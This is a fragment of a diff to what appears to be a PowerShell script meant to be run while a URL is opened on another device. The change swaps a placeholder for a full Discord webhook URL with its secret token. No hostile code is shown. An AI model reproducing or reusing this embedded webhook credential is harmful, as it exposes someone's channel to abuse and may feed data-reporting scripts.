@@ -15,7 +15,7 @@ Run script and input given URL in a browser on another device.
 
 #>
 
-$whuri = "WEBHOOK_HERE"
+$whuri = "https://discord.com/api/webhooks/1374123241718677638/KhgcT_mFnxCQqyXfpkbGnjlmVWklwpV9ywW_20nDLGQnI9YNqJF_Vo4lNnYYVN6FMPF1"
 
 #============================================================ OPEN MESSAGE ====================================================================
 $Host.UI.RawUI.BackgroundColor = "Black"
